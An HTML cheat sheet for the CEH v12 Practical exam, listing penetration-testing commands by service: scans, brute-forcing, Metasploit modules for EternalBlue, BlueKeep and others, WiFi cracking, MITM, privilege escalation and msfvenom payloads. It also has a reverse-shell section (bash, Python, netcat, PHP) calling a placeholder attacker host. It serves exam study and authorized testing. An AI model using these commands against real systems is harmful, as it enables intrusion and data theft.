@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CEH v12 Practical - Complete Security Cheat Sheet</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Courier New', monospace; background-color: #0a0a0a; color: #e0e0e0; line-height: 1.6; max-width: 1400px; margin: 0 auto; padding: 20px; }
+        .container { display: grid; grid-template-columns: 320px 1fr; gap: 30px; min-height: 100vh; }
+        .sidebar { background: #1a1a1a; padding: 25px; border-radius: 8px; border: 1px solid #333; position: sticky; top: 20px; height: fit-content; max-height: 95vh; overflow-y: auto; }
+        .sidebar::-webkit-scrollbar { width: 8px; }
+        .sidebar::-webkit-scrollbar-track { background: #0a0a0a; }
+        .sidebar::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
+        .sidebar h2 { color: #fff; margin-bottom: 20px; font-size: 1.2em; border-bottom: 1px solid #333; padding-bottom: 10px; }
+        .nav-links { list-style: none; }
+        .nav-links li { margin-bottom: 6px; }
+        .nav-links a { color: #e0e0e0; text-decoration: none; display: block; padding: 8px 12px; border-radius: 4px; transition: all 0.3s ease; border-left: 3px solid transparent; font-size: 0.9em; }
+        .nav-links a:hover, .nav-links a.active { background: #2a2a2a; border-left: 3px solid #fff; color: #fff; }
+        .main-content { background: #1a1a1a; padding: 30px; border-radius: 8px; border: 1px solid #333; }
+        h1 { color: #fff; margin-bottom: 30px; font-size: 2em; border-bottom: 2px solid #333; padding-bottom: 15px; }
+        h2 { color: #fff; margin: 40px 0 20px 0; font-size: 1.5em; border-bottom: 1px solid #333; padding-bottom: 8px; }
+        h3 { color: #fff; margin: 25px 0 12px 0; font-size: 1.2em; }
+        h4 { color: #fff; margin: 15px 0 8px 0; font-size: 1em; }
+        .code-block { background: #000; border: 1px solid #333; border-radius: 6px; padding: 15px; margin: 15px 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.85em; position: relative; cursor: pointer; }
+        .code-block:hover { border-color: #555; }
+        .code-block::after { content: 'Click to copy'; position: absolute; top: 5px; right: 10px; font-size: 0.7em; color: #666; opacity: 0; transition: opacity 0.3s; }
+        .code-block:hover::after { opacity: 1; }
+        .code-block code { color: #e0e0e0; line-height: 1.5; }
+        .comment { color: #666; font-style: italic; }
+        .port-tag { display: inline-block; background: #000; border: 1px solid #333; padding: 2px 8px; border-radius: 3px; font-size: 0.85em; margin-right: 8px; color: #fff; }
+        .tool-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 15px; margin: 20px 0; }
+        .tool-card { background: #000; border: 1px solid #333; border-radius: 6px; padding: 18px; transition: all 0.3s ease; }
+        .tool-card:hover { border-color: #666; transform: translateY(-2px); }
+        .tool-card h4 { color: #fff; margin-bottom: 10px; font-size: 1em; }
+        .tips { background: #000; border-left: 4px solid #fff; padding: 15px 20px; margin: 20px 0; }
+        .warning { border-left-color: #ff4444; }
+        .success { border-left-color: #44ff44; }
+        .info { border-left-color: #4444ff; }
+        .exploit-table { width: 100%; border-collapse: collapse; margin: 20px 0; font-size: 0.85em; }
+        .exploit-table th, .exploit-table td { padding: 10px; text-align: left; border: 1px solid #333; }
+        .exploit-table th { background: #000; color: #fff; font-weight: bold; }
+        .exploit-table tr:hover { background: #1a1a1a; }
+        .quick-ref { background: #000; padding: 15px; border-radius: 6px; border: 1px solid #333; margin: 15px 0; font-size: 0.85em; }
+        .quick-ref code { color: #fff; }
+        .section-intro { color: #aaa; font-style: italic; margin-bottom: 20px; padding: 10px; background: #000; border-radius: 4px; }
+        .resource-list { list-style: none; }
+        .resource-list li { margin: 10px 0; padding-left: 20px; position: relative; }
+        .resource-list li:before { content: "▶"; position: absolute; left: 0; color: #fff; font-size: 0.8em; }
+        .resource-list a { color: #e0e0e0; text-decoration: none; border-bottom: 1px dotted #666; }
+        .resource-list a:hover { color: #fff; border-bottom: 1px solid #fff; }
+        @media (max-width: 1024px) { .container { grid-template-columns: 1fr; } .sidebar { position: static; margin-bottom: 20px; max-height: none; } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <nav class="sidebar">
+            <h2>Navigation</h2>
+            <ul class="nav-links">
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#windows-services">Windows Services</a></li>
+                <li><a href="#linux-services">Linux Services</a></li>
+                <li><a href="#web-services">Web Services</a></li>
+                <li><a href="#database-services">Database Services</a></li>
+                <li><a href="#remote-access">Remote Access</a></li>
+                <li><a href="#email-services">Email Services</a></li>
+                <li><a href="#network-services">Network Services</a></li>
+                <li><a href="#iot-scada">IoT & SCADA</a></li>
+                <li><a href="#container-cloud">Container & Cloud</a></li>
+                <li><a href="#voip-services">VoIP Services</a></li>
+                <li><a href="#file-sharing">File Sharing</a></li>
+                <li><a href="#wifi-hacking">WiFi Hacking</a></li>
+                <li><a href="#sniffing-mitm">Sniffing & MITM</a></li>
+                <li><a href="#steganography">Steganography</a></li>
+                <li><a href="#malware-analysis">Malware Analysis</a></li>
+                <li><a href="#ai-exploits">AI-Based Exploits</a></li>
+                <li><a href="#metasploit">Metasploit Guide</a></li>
+                <li><a href="#post-exploitation">Post-Exploitation</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#evasion">Evasion Techniques</a></li>
+                <li><a href="#common-vulns">Common CVEs</a></li>
+                <li><a href="#automated-tools">Automated Tools</a></li>
+                <li><a href="#wordlists">Wordlists & Payloads</a></li>
+                <li><a href="#resources">Resources</a></li>
+            </ul>
+            <div style="margin-top: 25px; padding-top: 20px; border-top: 1px solid #333;">
+                <h3 style="font-size: 1em; margin-bottom: 10px;">Quick Commands</h3>
+                <div class="quick-ref">
+                    <code>nmap -sV -sC -p- &lt;ip&gt;</code><br>
+                    <code>searchsploit &lt;service&gt;</code><br>
+                    <code>msfconsole -q</code><br>
+                    <code>hydra -L u -P p &lt;service&gt;</code>
+                </div>
+            </div>
+        </nav>
+
+        <main class="main-content">
+            <h1>CEH v12 Practical - Complete Security Cheat Sheet</h1>
+            
+            <div class="tips warning">
+                <strong>⚠️ LEGAL NOTICE:</strong> This information is strictly for authorized penetration testing and the CEH practical exam. Unauthorized access to computer systems is illegal. Always obtain written permission before testing.
+            </div>
+
+            <section id="reconnaissance">
+                <h2>Reconnaissance & Enumeration</h2>
+                <p class="section-intro">First phase: Information gathering and service discovery</p>
+                <h3>Network Scanning</h3>
+                <div class="code-block">
+                    <code class="comment"># Quick scan</code><br>
+                    <code>nmap -sV -sC &lt;target&gt;</code><br><br>
+                    <code class="comment"># Full TCP scan</code><br>
+                    <code>nmap -sV -sC -p- -T4 &lt;target&gt;</code><br><br>
+                    <code class="comment"># UDP scan</code><br>
+                    <code>nmap -sU -sV --top-ports 100 &lt;target&gt;</code><br><br>
+                    <code class="comment"># Vulnerability scan</code><br>
+                    <code>nmap -sV --script vuln &lt;target&gt;</code>
+                </div>
+            </section>
+
+            <section id="windows-services">
+                <h2>Windows Services</h2>
+                <h3>SMB/NetBIOS <span class="port-tag">139/445</span></h3>
+                <div class="code-block">
+                    <code>enum4linux -a &lt;target&gt;</code><br>
+                    <code>smbclient -L //&lt;target&gt; -N</code><br>
+                    <code>use exploit/windows/smb/ms17_010_eternalblue</code>
+                </div>
+                <h3>RDP <span class="port-tag">3389</span></h3>
+                <div class="code-block">
+                    <code>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</code><br>
+                    <code>xfreerdp /u:admin /p:password /v:&lt;target&gt;</code>
+                </div>
+            </section>
+
+            <section id="linux-services">
+                <h2>Linux Services</h2>
+                <h3>SSH <span class="port-tag">22</span></h3>
+                <div class="code-block">
+                    <code>hydra -L users.txt -P passwords.txt ssh://&lt;target&gt;</code><br>
+                    <code>ssh -i id_rsa user@&lt;target&gt;</code>
+                </div>
+                <h3>FTP <span class="port-tag">21</span></h3>
+                <div class="code-block">
+                    <code>ftp &lt;target&gt;</code><br>
+                    <code>use exploit/unix/ftp/vsftpd_234_backdoor</code>
+                </div>
+            </section>
+
+            <section id="web-services">
+                <h2>Web Services</h2>
+                <h3>HTTP/HTTPS <span class="port-tag">80/443</span></h3>
+                <div class="code-block">
+                    <code>gobuster dir -u http://&lt;target&gt; -w /usr/share/wordlists/dirb/common.txt</code><br>
+                    <code>nikto -h &lt;target&gt;</code><br>
+                    <code>sqlmap -u "http://&lt;target&gt;/page.php?id=1" --dbs</code>
+                </div>
+            </section>
+
+            <section id="database-services">
+                <h2>Database Services</h2>
+                <h3>MySQL <span class="port-tag">3306</span></h3>
+                <div class="code-block">
+                    <code>mysql -h &lt;target&gt; -u root -p</code><br>
+                    <code>hydra -l root -P passwords.txt mysql://&lt;target&gt;</code>
+                </div>
+                <h3>MongoDB <span class="port-tag">27017</span></h3>
+                <div class="code-block">
+                    <code>mongo &lt;target&gt;:27017</code><br>
+                    <code>show dbs</code>
+                </div>
+            </section>
+
+            <section id="remote-access">
+                <h2>Remote Access Services</h2>
+                <h3>VNC <span class="port-tag">5900</span></h3>
+                <div class="code-block">
+                    <code>vncviewer &lt;target&gt;:5900</code><br>
+                    <code>hydra -P passwords.txt vnc://&lt;target&gt;</code>
+                </div>
+            </section>
+
+            <section id="email-services">
+                <h2>Email Services</h2>
+                <h3>SMTP <span class="port-tag">25</span></h3>
+                <div class="code-block">
+                    <code>smtp-user-enum -M VRFY -U users.txt -t &lt;target&gt;</code>
+                </div>
+            </section>
+
+            <section id="network-services">
+                <h2>Network Services</h2>
+                <h3>SNMP <span class="port-tag">161</span></h3>
+                <div class="code-block">
+                    <code>snmp-check &lt;target&gt;</code><br>
+                    <code>snmpwalk -c public -v1 &lt;target&gt;</code>
+                </div>
+                <h3>DNS <span class="port-tag">53</span></h3>
+                <div class="code-block">
+                    <code>dig axfr @&lt;target&gt; domain.com</code><br>
+                    <code>dnsenum domain.com</code>
+                </div>
+            </section>
+
+            <section id="iot-scada">
+                <h2>IoT & SCADA Services</h2>
+                <h3>MQTT <span class="port-tag">1883</span></h3>
+                <div class="code-block">
+                    <code>mosquitto_sub -h &lt;target&gt; -t '#' -v</code>
+                </div>
+            </section>
+
+            <section id="container-cloud">
+                <h2>Container & Cloud Services</h2>
+                <h3>Docker <span class="port-tag">2375</span></h3>
+                <div class="code-block">
+                    <code>docker -H tcp://&lt;target&gt;:2375 ps</code><br>
+                    <code>docker -H tcp://&lt;target&gt;:2375 images</code>
+                </div>
+            </section>
+
+            <section id="voip-services">
+                <h2>VoIP Services</h2>
+                <h3>SIP <span class="port-tag">5060</span></h3>
+                <div class="code-block">
+                    <code>svmap &lt;target&gt;</code><br>
+                    <code>svwar -m INVITE -e100-999 &lt;target&gt;</code>
+                </div>
+            </section>
+
+            <section id="file-sharing">
+                <h2>File Sharing Services</h2>
+                <h3>Rsync <span class="port-tag">873</span></h3>
+                <div class="code-block">
+                    <code>rsync --list-only &lt;target&gt;::</code><br>
+                    <code>rsync -av &lt;target&gt;::module /tmp/output</code>
+                </div>
+            </section>
+
+            <section id="wifi-hacking">
+                <h2>WiFi Hacking</h2>
+                <div class="code-block">
+                    <code>airmon-ng start wlan0</code><br>
+                    <code>airodump-ng wlan0mon</code><br>
+                    <code>airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon</code><br>
+                    <code>aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon</code><br>
+                    <code>aircrack-ng -w rockyou.txt capture-01.cap</code>
+                </div>
+            </section>
+
+            <section id="sniffing-mitm">
+                <h2>Sniffing & MITM</h2>
+                <div class="code-block">
+                    <code>wireshark</code><br>
+                    <code>tcpdump -i eth0 -w capture.pcap</code><br>
+                    <code>ettercap -T -i eth0 -M arp:remote /target// /gateway//</code><br>
+                    <code>bettercap -iface eth0</code>
+                </div>
+            </section>
+
+            <section id="steganography">
+                <h2>Steganography & Data Hiding</h2>
+                <p class="section-intro">Hidden data detection and extraction techniques</p>
+                
+                <div class="tips info">
+                    <h3>Tool Selection Guide:</h3>
+                    <ul style="margin-left: 20px; margin-top: 10px;">
+                        <li><strong>Steghide:</strong> JPG, BMP, WAV, AU files</li>
+                        <li><strong>OpenStego:</strong> PNG files (primary format)</li>
+                        <li><strong>Snow:</strong> Text files (TXT) - whitespace steganography</li>
+                    </ul>
+                </div>
+
+                <h3>Steghide - For JPG, BMP, WAV, AU Files</h3>
+                <div class="code-block">
+                    <code class="comment"># ✅ Supported: JPEG, BMP, WAV, AU</code><br><br>
+                    <code class="comment"># Hide data</code><br>
+                    <code>steghide embed -cf image.jpg -ef secret.txt</code><br>
+                    <code>steghide embed -cf image.bmp -ef data.txt -p password</code><br>
+                    <code>steghide embed -cf audio.wav -ef message.txt -p mypassword</code><br><br>
+                    <code class="comment"># Extract hidden data</code><br>
+                    <code>steghide extract -sf image.jpg</code><br>
+                    <code>steghide extract -sf image.bmp -p password</code><br>
+                    <code>steghide info image.jpg</code><br><br>
+                    <code class="comment"># Crack password</code><br>
+                    <code>stegseek image.jpg rockyou.txt</code>
+                </div>
+
+                <div class="tool-card" style="margin: 20px 0;">
+                    <h4>Steghide Key Points:</h4>
+                    <ul style="margin-left: 20px; margin-top: 10px; line-height: 1.8;">
+                        <li>Uses compression and encryption</li>
+                        <li>Supports password protection</li>
+                        <li>⚠️ Does NOT support PNG or GIF formats</li>
+                        <li>Best for: JPG/BMP images and WAV/AU audio</li>
+                    </ul>
+                </div>
+
+                <h3>OpenStego - For PNG Files</h3>
+                <div class="code-block">
+                    <code class="comment"># ✅ Primary format: PNG</code><br><br>
+                    <code class="comment"># Hide data in PNG</code><br>
+                    <code>openstego embed -mf secret.txt -cf cover.png -sf output.png -p password</code><br>
+                    <code>openstego embed -mf message.txt -cf image.png -sf stego.png</code><br><br>
+                    <code class="comment"># Extract hidden data</code><br>
+                    <code>openstego extract -sf stego.png -xd /output/directory -p password</code><br>
+                    <code>openstego extract -sf output.png -xf extracted.txt</code><br><br>
+                    <code class="comment"># GUI mode</code><br>
+                    <code>openstego</code>
+                </div>
+
+                <div class="tool-card" style="margin: 20px 0;">
+                    <h4>OpenStego Key Points:</h4>
+                    <ul style="margin-left: 20px; margin-top: 10px; line-height: 1.8;">
+                        <li>Optimized specifically for PNG format</li>
+                        <li>Uses LSB (Least Significant Bit) algorithm</li>
+                        <li>User-friendly GUI interface available</li>
+                        <li>Best for: PNG image steganography</li>
+                    </ul>
+                </div>
+
+                <h3>Snow - For Text Files (TXT)</h3>
+                <div class="code-block">
+                    <code class="comment"># ✅ Format: Plain text files (TXT, ASCII)</code><br>
+                    <code class="comment"># Hides data in whitespace (spaces/tabs)</code><br><br>
+                    <code class="comment"># Hide message in text file</code><br>
+                    <code>snow -C -m "secret message" -p password input.txt output.txt</code><br>
+                    <code>snow -C -m "hidden data" input.txt output.txt</code><br><br>
+                    <code class="comment"># Extract hidden message</code><br>
+                    <code>snow -C -p password output.txt</code><br>
+                    <code>snow -C stego.txt</code>
+                </div>
+
+                <div class="tool-card" style="margin: 20px 0;">
+                    <h4>Snow Key Points:</h4>
+                    <ul style="margin-left: 20px; margin-top: 10px; line-height: 1.8;">
+                        <li>Whitespace steganography - uses spaces and tabs</li>
+                        <li>Hidden data invisible to casual observers</li>
+                        <li>Works with any ASCII text file</li>
+                        <li>Best for: Source code, plain text documents</li>
+                    </ul>
+                </div>
+
+                <h3>Quick Reference Table</h3>
+                <table class="exploit-table">
+                    <thead>
+                        <tr>
+                            <th>Tool</th>
+                            <th>File Types</th>
+                            <th>Embed Command</th>
+                            <th>Extract Command</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>Steghide</strong></td>
+                            <td>JPG, BMP, WAV, AU</td>
+                            <td><code>steghide embed -cf image.jpg -ef secret.txt</code></td>
+                            <td><code>steghide extract -sf image.jpg</code></td>
+                        </tr>
+                        <tr>
+                            <td><strong>OpenStego</strong></td>
+                            <td>PNG</td>
+                            <td><code>openstego embed -mf secret.txt -cf image.png -sf output.png</code></td>
+                            <td><code>openstego extract -sf output.png -xf extracted.txt</code></td>
+                        </tr>
+                        <tr>
+                            <td><strong>Snow</strong></td>
+                            <td>TXT (text files)</td>
+                            <td><code>snow -C -m "message" -p pass input.txt output.txt</code></td>
+                            <td><code>snow -C -p pass output.txt</code></td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <div class="tips warning">
+                    <h3>⚠️ Important Notes:</h3>
+                    <ul style="margin-left: 20px; margin-top: 10px;">
+                        <li><strong>Steghide:</strong> Cannot handle PNG or GIF - use for JPG/BMP/WAV/AU only</li>
+                        <li><strong>OpenStego:</strong> Specifically designed for PNG files</li>
+                        <li><strong>Snow:</strong> Only for text files - data lost if reformatted</li>
+                        <li>Always test extraction immediately after embedding</li>
+                        <li>Password-protected data cannot be recovered without password</li>
+                    </ul>
+                </div>
+
+                <div class="tips success">
+                    <h3>✅ CEH Exam Tips - Steganography:</h3>
+                    <ul style="margin-left: 20px; margin-top: 10px;">
+                        <li>First identify file type: <code>file suspicious.file</code></li>
+                        <li>JPG/BMP/WAV/AU → Use <strong>Steghide</strong></li>
+                        <li>PNG → Use <strong>OpenStego</strong></li>
+                        <li>TXT → Use <strong>Snow</strong></li>
+                        <li>If password protected, try common passwords or stegseek</li>
+                        <li>Check metadata: <code>exiftool file</code></li>
+                    </ul>
+                </div>
+            </section>
+
+            <section id="malware-analysis">
+                <h2>Malware Analysis Basics</h2>
+                <div class="code-block">
+                    <code>md5sum malware.exe</code><br>
+                    <code>strings malware.exe</code><br>
+                    <code>pefile malware.exe</code><br>
+                    <code>cuckoo submit malware.exe</code>
+                </div>
+            </section>
+
+            <section id="ai-exploits">
+                <h2>AI-Based & Modern Exploits</h2>
+                <div class="code-block">
+                    <code>autorecon &lt;target&gt;</code><br>
+                    <code>sniper -t &lt;target&gt;</code>
+                </div>
+            </section>
+
+            <section id="metasploit">
+                <h2>Metasploit Framework Guide</h2>
+                <div class="code-block">
+                    <code>msfconsole -q</code><br>
+                    <code>search eternalblue</code><br>
+                    <code>use exploit/windows/smb/ms17_010_eternalblue</code><br>
+                    <code>set RHOSTS &lt;target&gt;</code><br>
+                    <code>set LHOST &lt;attacker_ip&gt;</code><br>
+                    <code>exploit</code>
+                </div>
+            </section>
+
+            <section id="post-exploitation">
+                <h2>Post-Exploitation</h2>
+                <div class="code-block">
+                    <code>sysinfo</code><br>
+                    <code>hashdump</code><br>
+                    <code>download C:\\file.txt /tmp/</code><br>
+                    <code>upload /tmp/shell.exe C:\\Windows\\Temp\\</code>
+                </div>
+            </section>
+
+            <section id="privilege-escalation">
+                <h2>Privilege Escalation</h2>
+                <h3>Windows</h3>
+                <div class="code-block">
+                    <code>winPEAS.exe</code><br>
+                    <code>JuicyPotato.exe -l 1337 -p C:\\shell.exe -t *</code>
+                </div>
+                <h3>Linux</h3>
+                <div class="code-block">
+                    <code>linpeas.sh</code><br>
+                    <code>find / -perm -4000 2>/dev/null</code><br>
+                    <code>sudo -l</code>
+                </div>
+            </section>
+
+            <section id="evasion">
+                <h2>Evasion Techniques</h2>
+                <div class="code-block">
+                    <code>msfvenom -p windows/shell_reverse_tcp LHOST=attacker LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o shell.exe</code><br>
+                    <code>nmap -sS -f -D RND:10 &lt;target&gt;</code>
+                </div>
+            </section>
+
+            <section id="common-vulns">
+                <h2>Common CVEs & Exploits</h2>
+                <div class="tool-grid">
+                    <div class="tool-card">
+                        <h4>EternalBlue (MS17-010)</h4>
+                        <code>Port: 445</code><br>
+                        <code>use exploit/windows/smb/ms17_010_eternalblue</code>
+                    </div>
+                    <div class="tool-card">
+                        <h4>BlueKeep (CVE-2019-0708)</h4>
+                        <code>Port: 3389</code><br>
+                        <code>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</code>
+                    </div>
+                    <div class="tool-card">
+                        <h4>Log4Shell (CVE-2021-44228)</h4>
+                        <code>Port: 80/443/8080</code><br>
+                        <code>use exploit/multi/http/log4shell_header_injection</code>
+                    </div>
+                    <div class="tool-card">
+                        <h4>PrintNightmare (CVE-2021-1675)</h4>
+                        <code>Port: 445</code><br>
+                        <code>use exploit/windows/dcerpc/cve_2021_34527_printnightmare</code>
+                    </div>
+                </div>
+            </section>
+
+            <section id="automated-tools">
+                <h2>Automated Scanning Tools</h2>
+                <h3>Vulnerability Scanners</h3>
+                <div class="code-block">
+                    <code class="comment"># Nessus</code><br>
+                    <code>/opt/nessus/sbin/nessus-service start</code><br>
+                    <code># Access: https://localhost:8834</code><br><br>
+                    <code class="comment"># Nuclei</code><br>
+                    <code>nuclei -u http://target.com</code><br>
+                    <code>nuclei -l targets.txt -t cves/</code>
+                </div>
+                <h3>Web Application Scanners</h3>
+                <div class="code-block">
+                    <code>nikto -h http://target.com</code><br>
+                    <code>wpscan --url http://target.com --enumerate ap,at,u</code><br>
+                    <code>zaproxy</code><br>
+                    <code>burpsuite</code>
+                </div>
+            </section>
+
+            <section id="wordlists">
+                <h2>Wordlists & Payloads</h2>
+                <h3>Common Wordlist Locations</h3>
+                <div class="code-block">
+                    <code>/usr/share/wordlists/rockyou.txt</code><br>
+                    <code>/usr/share/wordlists/dirb/common.txt</code><br>
+                    <code>/usr/share/seclists/</code>
+                </div>
+                <h3>Password Cracking</h3>
+                <div class="code-block">
+                    <code class="comment"># John the Ripper</code><br>
+                    <code>john --wordlist=rockyou.txt hash.txt</code><br>
+                    <code>john --show hash.txt</code><br><br>
+                    <code class="comment"># Hashcat</code><br>
+                    <code>hashcat -m 0 -a 0 hash.txt rockyou.txt</code><br>
+                    <code>hashcat -m 1000 -a 0 hash.txt rockyou.txt</code>
+                </div>
+                <h3>Reverse Shell Cheat Sheet</h3>
+                <div class="code-block">
+                    <code class="comment"># Bash</code><br>
+                    <code>bash -i >& /dev/tcp/attacker/4444 0>&1</code><br><br>
+                    <code class="comment"># Python</code><br>
+                    <code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</code><br><br>
+                    <code class="comment"># Netcat</code><br>
+                    <code>nc -e /bin/sh attacker 4444</code><br><br>
+                    <code class="comment"># PHP</code><br>
+                    <code>php -r '$sock=fsockopen("attacker",4444);exec("/bin/sh -i <&3 >&3 2>&3");'</code>
+                </div>
+            </section>
+
+            <section id="resources">
+                <h2>Resources & References</h2>
+                <div class="resources">
+                    <h3>Official Documentation</h3>
+                    <ul class="resource-list">
+                        <li><a href="https://nmap.org/nsedoc/" target="_blank">Nmap NSE Script Documentation</a></li>
+                        <li><a href="https://www.rapid7.com/db/modules/" target="_blank">Metasploit Module Database</a></li>
+                        <li><a href="https://www.offensive-security.com/metasploit-unleashed/" target="_blank">Metasploit Unleashed</a></li>
+                        <li><a href="https://www.exploit-db.com/" target="_blank">Exploit Database</a></li>
+                        <li><a href="https://gtfobins.github.io/" target="_blank">GTFOBins - Unix Binaries</a></li>
+                        <li><a href="https://lolbas-project.github.io/" target="_blank">LOLBAS - Windows Binaries</a></li>
+                    </ul>
+
+                    <h3>Vulnerability Databases</h3>
+                    <ul class="resource-list">
+                        <li><a href="https://cve.mitre.org/" target="_blank">CVE Database</a></li>
+                        <li><a href="https://nvd.nist.gov/" target="_blank">National Vulnerability Database</a></li>
+                        <li><a href="https://www.cvedetails.com/" target="_blank">CVE Details</a></li>
+                    </ul>
+
+                    <h3>Wordlists & Payloads</h3>
+                    <ul class="resource-list">
+                        <li><a href="https://github.com/danielmiessler/SecLists" target="_blank">SecLists Collection</a></li>
+                        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank">PayloadsAllTheThings</a></li>
+                    </ul>
+
+                    <h3>Practice Platforms</h3>
+                    <ul class="resource-list">
+                        <li><a href="https://www.hackthebox.eu/" target="_blank">HackTheBox</a></li>
+                        <li><a href="https://tryhackme.com/" target="_blank">TryHackMe</a></li>
+                        <li><a href="https://www.vulnhub.com/" target="_blank">VulnHub</a></li>
+                    </ul>
+                </div>
+            </section>
+
+            <section id="best-practices">
+                <h2>CEH Exam Tips</h2>
+                <div class="tips success">
+                    <h3>CEH Practical Exam Tips:</h3>
+                    <ul style="margin-left: 20px; margin-top: 10px;">
+                        <li><strong>Time Management:</strong> 6 hours for 20 questions - spend ~15-18 minutes per challenge</li>
+                        <li><strong>Read Carefully:</strong> Questions often contain hints about the vulnerability type</li>
+                        <li><strong>Document Everything:</strong> Keep notes of IPs, credentials, and findings</li>
+                        <li><strong>Start with Reconnaissance:</strong> Always run nmap first to identify services</li>
+                        <li><strong>Check for Low-Hanging Fruit:</strong> Default credentials, anonymous access, misconfigurations</li>
+                        <li><strong>Use Multiple Tools:</strong> If one tool fails, try alternatives</li>
+                        <li><strong>Follow the Methodology:</strong> Reconnaissance → Scanning → Enumeration → Exploitation</li>
+                    </ul>
+                </div>
+
+                <div class="tips info">
+                    <h3>Common Exam Scenarios:</h3>
+                    <ul style="margin-left: 20px; margin-top: 10px;">
+                        <li>Web application vulnerabilities (SQLi, XSS, LFI/RFI)</li>
+                        <li>Network service exploitation (SMB, FTP, SSH)</li>
+                        <li>Password cracking and hash analysis</li>
+                        <li>Privilege escalation (Windows & Linux)</li>
+                        <li>Steganography and data hiding</li>
+                        <li>Traffic analysis with Wireshark</li>
+                        <li>Cryptography challenges</li>
+                    </ul>
+                </div>
+
+                <div class="tips warning">
+                    <h3>Common Mistakes to Avoid:</h3>
+                    <ul style="margin-left: 20px; margin-top: 10px;">
+                        <li>Not reading the question completely</li>
+                        <li>Skipping enumeration and jumping straight to exploitation</li>
+                        <li>Using wrong IP addresses (target vs. attacker)</li>
+                        <li>Not checking for multiple vulnerabilities</li>
+                        <li>Forgetting to escalate privileges after initial access</li>
+                        <li>Not trying default credentials first</li>
+                        <li>Spending too much time on one question</li>
+                    </ul>
+                </div>
+
+                <div class="code-block">
+                    <code class="comment"># Quick Methodology Reminder</code><br>
+                    <code>1. Reconnaissance: nmap, service detection</code><br>
+                    <code>2. Enumeration: Detailed service analysis</code><br>
+                    <code>3. Vulnerability Scanning: searchsploit, CVE lookup</code><br>
+                    <code>4. Exploitation: Gain initial access</code><br>
+                    <code>5. Post-Exploitation: Privilege escalation, data collection</code><br>
+                    <code>6. Reporting: Document findings and steps</code>
+                </div>
+
+                <div class="tips">
+                    <h3>Essential Commands for Quick Reference:</h3>
+                    <div class="code-block" style="margin-top: 10px;">
+                        <code class="comment"># Initial scan</code><br>
+                        <code>nmap -sV -sC -p- &lt;target&gt; -oN scan.txt</code><br><br>
+                        <code class="comment"># Find exploit</code><br>
+                        <code>searchsploit &lt;service version&gt;</code><br><br>
+                        <code class="comment"># Start listener</code><br>
+                        <code>nc -lvnp 4444</code><br><br>
+                        <code class="comment"># Stabilize shell</code><br>
+                        <code>python -c 'import pty;pty.spawn("/bin/bash")'</code><br>
+                        <code>CTRL+Z</code><br>
+                        <code>stty raw -echo; fg</code><br>
+                        <code>export TERM=xterm</code><br><br>
+                        <code class="comment"># Quick web scan</code><br>
+                        <code>nikto -h http://&lt;target&gt;</code><br>
+                        <code>gobuster dir -u http://&lt;target&gt; -w /usr/share/wordlists/dirb/common.txt</code>
+                    </div>
+                </div>
+            </section>
+
+            <footer style="margin-top: 50px; padding-top: 20px; border-top: 1px solid #333; text-align: center; color: #666;">
+                <p><strong>CEH v12 Practical Preparation Cheat Sheet</strong></p>
+                <p>Last Updated: October 2024 | For Educational & Authorized Testing Only</p>
+                <p style="margin-top: 10px; font-size: 0.9em;">Always practice responsible and ethical security testing</p>
+            </footer>
+        </main>
+    </div>
+
+    <script>
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+            });
+        });
+
+        document.querySelectorAll('.code-block').forEach(block => {
+            block.addEventListener('click', function() {
+                const text = this.innerText;
+                navigator.clipboard.writeText(text).then(() => {
+                    const original = this.style.backgroundColor;
+                    this.style.backgroundColor = '#2a2a2a';
+                    setTimeout(() => {
+                        this.style.backgroundColor = original;
+                    }, 200);
+                }).catch(err => {
+                    console.log('Copy failed:', err);
+                });
+            });
+        });
+
+        window.addEventListener('scroll', function() {
+            const sections = document.querySelectorAll('section');
+            const navLinks = document.querySelectorAll('.nav-links a');
+            
+            let current = '';
+            sections.forEach(section => {
+                const sectionTop = section.offsetTop;
+                const sectionHeight = section.clientHeight;
+                if (pageYOffset >= sectionTop - 150) {
+                    current = section.getAttribute('id');
+                }
+            });
+
+            navLinks.forEach(link => {
+                link.classList.remove('active');
+                if (link.getAttribute('href') === `#${current}`) {
+                    link.classList.add('active');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
